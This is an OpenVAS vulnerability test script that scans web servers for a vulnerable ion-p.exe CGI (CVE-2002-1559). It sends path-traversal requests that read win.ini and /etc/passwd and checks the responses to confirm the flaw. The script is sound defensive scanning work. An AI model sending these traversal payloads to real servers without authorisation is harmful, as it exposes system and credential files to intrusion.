###############################################################################
# OpenVAS Vulnerability Test
# $Id: ion_p.nasl 4149 2016-09-27 08:27:35Z cfi $
#
# ion-p.exe vulnerability
#
# Authors:
# John Lampe <j_lampe@bellsouth.net>
#
# Copyright:
# Copyright (C) 2003 John Lampe
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11729");
  script_version("$Revision: 4149 $");
  script_tag(name:"last_modification", value:"$Date: 2016-09-27 10:27:35 +0200 (Tue, 27 Sep 2016) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_bugtraq_id(6091);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_cve_id("CVE-2002-1559");
  script_name("ion-p.exe vulnerability");
  script_summary("Checks for the ion-p.exe file");
  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2003 John Lampe");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  tag_summary = "The ion-p.exe exists on this webserver.
  Some versions of this file are vulnerable to remote exploit.
  An attacker, exploiting this vulnerability, may be able to gain
  access to confidential data and/or escalate their privileges on
  the Web server.";

  tag_solution = "Remove it from the cgi-bin or scripts directory.";

  script_tag(name:"solution", value:tag_solution);
  script_tag(name:"summary", value:tag_summary);

  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port( default:80 );

foreach dir( make_list_unique( "/", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  url = dir + "/ion-p.exe?page=c:\\winnt\\win.ini";

  req = http_get( item:url, port:port );
  res = http_keepalive_send_recv( port:port, data:req );

  if( egrep( pattern:".*\[fonts\].*", string:res, icase:TRUE ) ) {
    report = report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }

  url = dir + "/ion-p.exe?page=../../../../../etc/passwd";

  if( http_vuln_check( port:port, url:url, pattern:".*root:.*:0:[01]:.*" ) ) {
    report = report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
